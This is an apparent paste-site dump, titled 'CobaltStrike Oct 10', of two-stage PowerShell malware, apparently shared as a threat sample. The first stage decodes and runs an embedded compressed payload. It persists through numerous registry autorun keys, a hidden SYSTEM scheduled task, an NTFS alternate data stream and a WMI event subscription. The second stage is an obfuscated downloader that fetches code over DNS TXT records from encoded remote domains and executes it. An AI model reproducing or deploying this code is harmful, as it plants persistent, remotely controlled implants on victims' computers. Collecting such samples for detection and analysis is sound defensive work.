<xml><title>CobaltStrike Oct 10_1507680720035</title><id>/pHFTHUw4<author>James_inthe_box</author><date>Oct 10th, 2017 07:11:57 PM UTC-5</date><content>1st stage:
$ServiceCode = @'
$data=[System.Convert]::FromBase64String('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');$ms=New-Object System.IO.MemoryStream;$ms.Write($data,0,$data.Length);$ms.Seek(0,0);$cs=New-Object System.IO.Compression.GZipStream($ms,[System.IO.Compression.CompressionMode]::Decompress);$sr=New-Object System.IO.StreamReader($cs);IEX $sr.readtoend();
'@
$stgBytes = [System.Text.Encoding]::Unicode.GetBytes($ServiceCode)
$stgB64 =[Convert]::ToBase64String($stgBytes)
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'IE' -Value $stgB64 -force
$stagerCode = @'
$b64=(Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop').IE;$stCode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64));[System.Threading.Mutex]$m;[bool]$mtmp=$false;$m=New-Object System.Threading.Mutex($true, [string]1823821749, [ref] $mtmp);if(!$mtmp){exit;}IEX $stCode;
'@
$eCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($stagerCode))
try{New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'IE' -Value "powershell.exe -ep bypass -noni -w hidden -e $eCmd" -force
} catch{}
try{New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'IE' -Value "powershell.exe -ep bypass -noni -w hidden -e $eCmd" -force
} catch{}
try{New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices' -Name 'IE' -Value "powershell.exe -ep bypass -noni -w hidden -e $eCmd" -force
} catch{}
try{New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion' -Name 'IE' -Value "powershell.exe -ep bypass -noni -w hidden -e $eCmd" -force
} catch{}
try{New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'IE' -Value "powershell.exe -ep bypass -noni -w hidden -e $eCmd" -force
} catch{}
try{New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS
New-ItemProperty -Path 'HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'IE' -Value "powershell.exe -ep bypass -noni -w hidden -e $eCmd" -force
} catch{}
try{New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name 'IE' -Value "powershell.exe -ep bypass -noni -w hidden -e $eCmd" -force
} catch{}
try{New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Services\VxD' -Name 'IE' -Value "powershell.exe -ep bypass -noni -w hidden -e $eCmd" -force
} catch{}
try{New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
New-ItemProperty -Path 'HKCR:\vbsfile\shell\open\command' -Name 'IE' -Value "powershell.exe -ep bypass -noni -w hidden -e $eCmd" -force
} catch{}
function Invoke-PrepareScheduledTask
{ $taskName = 'IE'
 $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if ($task -ne $null)
 {  Unregister-ScheduledTask -TaskName $taskName -Confirm:$false 
 }
 $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep bypass -noni -w hidden -e $eCmd"
 $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay 00:00:30
 $settings = New-ScheduledTaskSettingsSet -Compatibility Win8
 $principal = New-ScheduledTaskPrincipal -UserId SYSTEM -LogonType ServiceAccount -RunLevel Highest
 $definition = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Description "Run $($taskName) at startup"
 Register-ScheduledTask -TaskName $taskName -InputObject $definition
 $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 $psVersion = [convert]::ToInt32($($PSVersionTable.PSVersion.Major|Out-String).Trim())
 $adsDir = $env:programdata + '\Windows'
 $adsModuleName = 'kernel32.dll'
 if ($psVersion -gt 2)
 {  Set-Content -Path $adsDir -Value $ServiceCode -Stream 'kernel32.dll'
 }
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()) 
 if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
 {  
  $filterName = 'kernel32_Filter';
  $consumerName = 'kernel32_Consumer';
  
  Get-WmiObject __eventFilter -namespace root\subscription | Remove-WmiObject
  Get-WmiObject CommandLineEventConsumer -Namespace root\subscription | Remove-WmiObject
  Get-WmiObject __filtertoconsumerbinding -Namespace root\subscription | Remove-WmiObject
  $filterResult = Set-WmiInstance -Computername $env:COMPUTERNAME -Namespace 'root\subscription' -Class __EventFilter -Arguments @{Name = $filterName; EventNamespace = 'root\CIMV2'; QueryLanguage = 'WQL'; Query = "Select * from __InstanceCreationEvent within 30 where targetInstance isa 'Win32_LogonSession'"}
  if ($psVersion -gt 2)
  {$encCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX `$(Get-Content -Path $adsDir -Stream $adsModuleName|Out-String)"))
  Set-WmiInstance -Computername $env:COMPUTERNAME -Namespace 'root\subscription' -Class CommandLineEventConsumer -Arguments @{Name = $consumerName; ExecutablePath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; CommandLineTemplate = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -noni -w hidden -e $encCmd "}
  }
 }
 if ($task -ne $null)
 {  Write-Output "Created scheduled task: '$($task.ToString())'."
 }
 else
 {  Write-Output 'Created scheduled task: FAILED.'
 }}
Invoke-PrepareScheduledTask
IEX $stagerCode


2nd stage:
${_/\____/\/==\____} = 100
 function Download-Big-TXT
 {[CmdletBinding()]param([Parameter(ValueFromPipeline=$True)]$DomainList, [Parameter(ValueFromPipeline=$True)]${___/\/\/\__/==\_/=});
 ${_/\____/\/\__/\/=} = '';
 ${_/\/\/=\____/====} = _/===\/\/\/======\ $DomainList;
 ${/==\/\____/=\/\/\} = 0;
 ${_/===\_/=\___/\/\_} = "$(_/===\/\__/\_/\_/=).${___/\/\/\__/==\_/=}.${/==\/\____/=\/\/\}.${_/\/\/=\____/====}";
 ${__/\/==\/\/\_____} = _/==\/\_/\__/\/=== ${_/===\_/=\___/\/\_};
 if (${__/\/==\/\/\_____} -eq 0) { return 0
 }
 while (${__/\/==\/\/\_____} -ne $('0.0.0.0')))
 { Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBwADoAIAAkAHsAXwBfAC8AXAAvAD0APQBcAC8AXAAvAFwAXwBfAF8AXwBfAH0A')));
  ${_/====\/=\/\/=\/=} = ___/=\___/====\__/ ${__/\/==\/\/\_____};
  ${___/\/\/\_/=\__/\} = _/=\/=\/\/====\__/ ${_/====\/=\/\/=\/=};
  Write-Host ${___/\/\/\_/=\__/\};
  ${/==\/\/\_/\___/=\} = (_/=\___/==\/=\/\/\ ${_/===\_/=\___/\/\_}) -join '';
  if (${/==\/\/\_/\___/=\} -eq 0) {  return 0
  }
  ${_/\_/\_/\/\/===\/} = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider;
  ${/=====\_/\___/\__} = (${_/\_/\_/\/\/===\/}.ComputeHash([system.Text.Encoding]::UTF8.GetBytes(${/==\/\/\_/\___/=\})) | foreach{$_.ToString("X2") }) -join ""; 
  ${/=\/=====\/\_/\_/} = ___/==\_____/==\/\ ${/=====\_/\___/\__}.Substring(0, 8) | _/=\/=\/\/====\__/; if([string]${___/\/\/\_/=\__/\} -eq [string]${/=\/=====\/\_/\_/})
  { ${_/\____/\/\__/\/=} += ${/==\/\/\_/\___/=\};
  ${_/\/\/=\____/====} = _/===\/\/\/======\ $DomainList;
  ${/==\/\____/=\/\/\}++;
  }
  ${_/===\_/=\___/\/\_} = "$(_/===\/\__/\_/\_/=).${___/\/\/\__/==\_/=}.${/==\/\____/=\/\/\}.${_/\/\/=\____/====}";
  ${__/\/==\/\/\_____} = _/==\/\_/\__/\/=== ${_/===\_/=\___/\/\_};
  if (${__/\/==\/\/\_____} -eq 0) {  return 0
  }}
 return [string]${_/\____/\/\__/\/=};
 }
 function _/===\/\/\/======\
 {param([array]$DomainList)
 if($DomainList.count -eq 1)
 { return $DomainList;
 }
 return $DomainList[(Get-Random -Maximum ([array]$DomainList).count)];
 }
 function _/===\/\__/\_/\_/=()
 {${/=\/==\/=\/\/\/=\} = gwmi Win32_BIOS | Select -ExpandProperty SerialNumber ;
 ${_/\_/\_/\/\/===\/} = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider; 
 ${/=====\_/\___/\__} = (${_/\_/\_/\/\/===\/}.ComputeHash([system.Text.Encoding]::UTF8.GetBytes(${/=\/==\/=\/\/\/=\})) | %{$_.ToString("X2") }) -join ""; 
 return ${/=====\_/\___/\__}.Substring(0, 10);
 }
 function ___/\/\/==\/\____/
 {[CmdletBinding()]param([Parameter(ValueFromPipeline=$True)][array]$DomainList, [scriptblock]${__/===\___/\_/=\__});
 if((-not $DomainList) -or ($DomainList.count -eq 0))
 { Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAZABvAG0AYQBpAG4AcwA=')));
 }
  ${_/\/\/=\____/====} = _/===\/\/\/======\ $DomainList;
 try
 { return &amp;${__/===\___/\_/=\__} -Domain ${_/\/\/=\____/====};
 }
 catch
 { Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByADoAIAAkAGUAcgByAG8AcgA='))); 
  return ___/\/\/==\/\____/ ([array]($DomainList | ? {$_ -ne ${_/\/\/=\____/====} })) ${__/===\___/\_/=\__}; 
 }}
 function _/==\/\_/\__/\/===
 {[CmdletBinding()] param([Parameter()]${_/===\_/=\___/\/\_});
 Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBEAE4AUwBdACAAKABBACkAIAA9AD0APgAgACQAewBfAC8APQA9AD0AXABfAC8APQBcAF8AXwBfAC8AXAAvAFwAXwB9AA==')));
 ${_/\/\/=\_/\/\/=\_} = nslookup -type=a ${_/===\_/=\___/\/\_} 2&gt;&amp;1;
 ${__/\_/\__/\/\/==\} = [regex] $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABzACoAJAB7AF8ALwA9AD0APQBcAF8ALwA9AFwAXwBfAF8ALwBcAC8AXABfAH0AKAAuAGwAbwBjAGEAbABkAG8AbQBhAGkAbgApACoAXABzACoAQQBkAGQAcgBlAHMAcwAoAGUAcwApACoAOgBcAHMAKgAoAFsAXABkAFwALgBdACoAKQA=')));
 ${/====\__/\_/=\___} = ${__/\_/\__/\/\/==\}.Match(${_/\/\/=\_/\/\/=\_});
 ${_/=\/==\/\____/=\} = 0 
 while ((-not ${/====\__/\_/=\___}.Success) -and (${_/\____/\/==\____} -ne ${_/=\/==\/\____/=\})){ sleep -s 5
  ${_/=\/==\/\____/=\} = ${_/=\/==\/\____/=\} + 1
  ${_/\/\/=\_/\/\/=\_} = nslookup -type=a ${_/===\_/=\___/\/\_} 2&gt;&amp;1;
  ${__/\_/\__/\/\/==\} = [regex] $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABzACoAJAB7AF8ALwA9AD0APQBcAF8ALwA9AFwAXwBfAF8ALwBcAC8AXABfAH0AKAAuAGwAbwBjAGEAbABkAG8AbQBhAGkAbgApACoAXABzACoAQQBkAGQAcgBlAHMAcwAoAGUAcwApACoAOgBcAHMAKgAoAFsAXABkAFwALgBdACoAKQA=')));
  ${/====\__/\_/=\___} = ${__/\_/\__/\/\/==\}.Match(${_/\/\/=\_/\/\/=\_});
 }
 if (-not ${/====\__/\_/=\___}.Success) { return 0
 }
 return ${/====\__/\_/=\___}.Groups[3].Value;
 }
 function _/=\___/==\/=\/\/\
 {[CmdletBinding()]param([Parameter()]${_/===\_/=\___/\/\_});
 Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBEAE4AUwBdACAAKABUAFgAVAApACAAPQA9AD4AIAAkAHsAXwAvAD0APQA9AFwAXwAvAD0AXABfAF8AXwAvAFwALwBcAF8AfQA=')));
 ${_/\/\/=\_/\/\/=\_} = nslookup -type=txt ${_/===\_/=\___/\/\_} 2&gt;&amp;1;
 ${__/\_/\__/\/\/==\} = [regex] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAiAFsAXgBcAHMAXQAqACIAXABzACoAKQArAA==')));
 ${/==\/=\/===\/==\_} = ${__/\_/\__/\/\/==\}.Matches(${_/\/\/=\_/\/\/=\_});
 ${_/=\/==\/\____/=\} = 0 
 while ((${/==\/=\/===\/==\_}.count -eq 0) -and (${_/\____/\/==\____} -ne ${_/=\/==\/\____/=\})){ sleep -s 5
  ${_/=\/==\/\____/=\} = ${_/=\/==\/\____/=\} + 1
  ${_/\/\/=\_/\/\/=\_} = nslookup -type=txt ${_/===\_/=\___/\/\_} 2&gt;&amp;1;
  ${__/\_/\__/\/\/==\} = [regex] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAiAFsAXgBcAHMAXQAqACIAXABzACoAKQArAA==')));
  ${/==\/=\/===\/==\_} = ${__/\_/\__/\/\/==\}.Matches(${_/\/\/=\_/\/\/=\_});
 }
 if (${/==\/=\/===\/==\_}.count -eq 0) { return 0
 }
 return (${__/\_/\__/\/\/==\}.Matches(${_/\/\/=\_/\/\/=\_}) | Select -ExpandProperty Value) -join '' -replace '"' -replace '`n' -replace ' ';
 }
 function _/==\_/\_/=\/=\___
 {[CmdletBinding()]Param ([Parameter(Mandatory=$True,ValueFromPipeline=$True,ValueFromPipelineByPropertyName=$True)][byte[]] $byteArray = $(Throw($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBiAHkAdABlAEEAcgByAGEAeQAgAGkAcwAgAHIAZQBxAHUAaQByAGUAZAA='))))))
 Process
 { ${/=\/\_/==\_/==\__} = New-Object System.IO.MemoryStream;
  ${/=\/\_/==\_/==\__}.Write($byteArray, 0, $byteArray.Length);
  $null = ${/=\/\_/==\_/==\__}.Seek(0,0);
  ${/======\_/=\__/=\} = New-Object System.IO.Compression.GZipStream(${/=\/\_/==\_/==\__}, [System.IO.Compression.CompressionMode]::Decompress);
  ${_/\___/==\/\/==\_} = New-Object System.IO.MemoryStream;
  ${_/\/===\/==\/\__/} = New-Object System.IO.StreamReader(${/======\_/=\__/=\}, [system.Text.Encoding]::UTF8);
  echo ${_/\/===\/==\/\__/}.readtoend();
 }}
 function _/==\_/\/=\__/=\_/
 {[CmdletBinding()]param([Parameter(ValueFromPipeline=$True)]${_/====\/\/=\___/\/});
 if (${_/====\/\/=\___/\/} -eq 0) { return 0
 }
 ${__/\__/==\/\/====} = [System.Convert]::FromBase64String(${_/====\/\/=\___/\/}); 
 return _/==\_/\_/=\/=\___(${__/\__/==\/\/====});
 }
 function Get-Stage-PS
 {[CmdletBinding()]param([Parameter()]$DomainList); 
 return ___/\/\/==\/\____/ $DomainList
 {return _/=\___/==\/=\/\/\ "$(_/===\/\__/\_/\_/=).stage.${_/\/\/=\____/====}" | _/==\_/\/=\__/=\_/; };};
 function ___/\_____/====\__
 {[CmdletBinding()]param([Parameter(ValueFromPipeline=$True)]$DomainList); 
 return Download-Big-TXT $DomainList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAZwBlAA=='))) | _/==\_/\/=\__/=\_/;
 }
 function ___/==\_____/==\/\
 {[CmdletBinding()] param([Parameter(ValueFromPipeline=$True)]${__/=\/==\_/=\/\___});
 ${_/\/==\_/\_/\/\_/} = @{ '0' = 0;
  '1' = 1;
  '2' = 2;
  '3' = 3;
  '4' = 4;
  '5' = 5;
  '6' = 6;
  '7' = 7;
  '8' = 8;
  '9' = 9;
  'A' = 10;
  'B' = 11;
  'C' = 12;
  'D' = 13;
  'E' = 14;
  'F' = 15;
 };
 ${/=\/==\/=====\/=\} = "${__/=\/==\_/=\/\___}".Length;
 ${_/===\_/\/\/\__/=} = ${/=\/==\/=====\/=\};
 [uint64]${/==\/==\__/=\/\__} = 0;
 while (${/=\/==\/=====\/=\} -ne 0)
 { ${/=\/==\/=====\/=\}--;
  ${___/=\/\_/=\/====} = ${_/\/==\_/\_/\/\_/}[[string]${__/=\/==\_/=\/\___}[${/=\/==\/=====\/=\}]];
  ${_/=====\/=\/\__/\} = _/=====\_/\/====== 16 (${_/===\_/\/\/\__/=} - ${/=\/==\/=====\/=\} - 1);
  ${/==\/==\__/=\/\__} += [uint64]([uint64]${___/=\/\_/=\/====} * [uint64]${_/=====\/=\/\__/\});
 }
 return ${/==\/==\__/=\/\__};
 }
 function _/=====\_/\/======
 {[CmdletBinding()] param([Parameter(ValueFromPipeline=$True)]${__/\/=\/==\/\/\/=\}, [Parameter(ValueFromPipeline=$True)]${_/=\_/==\___/\__/\}); 
 return [Math]::Pow(${__/\/=\/==\/\/\/=\}, ${_/=\_/==\___/\__/\});
 }
 function _/=\/=\/\/====\__/
 {[CmdletBinding()]param([Parameter(ValueFromPipeline=$True)]${_/==\__/\_/====\_/}); 
 return [convert]::ToString(${_/==\__/\_/====\_/},2);
 }
 function ___/=\___/====\__/
 {[CmdletBinding()]param([Parameter(ValueFromPipeline=$True)]${___/=====\/=\/\_/\});
 ${_/\/\_/=====\___/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8APQA9AD0APQA9AFwALwA9AFwALwBcAF8ALwBcAH0A'))).Split(".");
 ${/=\/=\_/=\___/\__} = [uint64]([uint64]${_/\/\_/=====\___/}[0] * 16777216);
 ${_/=\__/=\/\/\/\__} = [uint64]([uint64]${_/\/\_/=====\___/}[1] * 65536);
 ${_/=\/=\/\____/==\} = [uint64]([uint64]${_/\/\_/=====\___/}[2] * 256);
 ${_/\/=\_/=\__/=\/=} = ${_/\/\_/=====\___/}[3];
 ${/=\_/\__/\/=\___/} = ${/=\/=\_/=\___/\__} + ${_/=\__/=\/\/\/\__} + ${_/=\/=\/\____/==\} + ${_/\/=\_/=\__/=\/=};
 return ${/=\_/\__/\/=\___/};
 }
 function Int-To-Ip
 {[CmdletBinding()] param([Parameter(ValueFromPipeline=$True)]$uint);
 ${/=\/=\_/=\___/\__} = [uint64]([uint64]$uint / 16777216) % 256;
 ${_/=\__/=\/\/\/\__} = [uint64]([uint64]$uint / 65536) % 256;
 ${_/=\/=\/\____/==\} = [uint64]([uint64]$uint / 256) % 256;
 ${_/\/=\_/=\__/=\/=} = [uint64]([uint64]$uint) % 256;
 return [string]${/=\/=\_/=\___/\__} + '.' + [string]${_/=\__/=\/\/\/\__} + '.' + [string]${_/=\/=\/\____/==\} + '.' + [string]${_/\/=\_/=\__/=\/=};
 }
 ${__/\/\/========\/} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADAALgBwAHcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADAALgBzAGkAdABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADAALgBzAHAAYQBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADAALgB3AGUAYgBzAGkAdABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADEALgBwAHIAZQBzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADEALgB3AGUAYgBzAGkAdABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADIALgBwAHIAZQBzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADMALgBzAGkAdABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADMALgBzAHAAYQBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADQALgBzAGkAdABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADQALgBzAHAAYQBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADUALgBiAGkAegA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADUALgBvAG4AbABpAG4AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBzADUALgBwAHcA'))));
 try
 {${_/\____/\/\__/\/=} = ___/\_____/====\__(${__/\/\/========\/}); iex ${_/\____/\/\__/\/=};
 }
 catch
 {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBNAGEAaQBuAF0AIABHAGUAbgBlAHIAYQBsACAAZgBhAGkAbAB1AHIAZQA=')));
 Write-Host $Error[0];
 }</content></xml>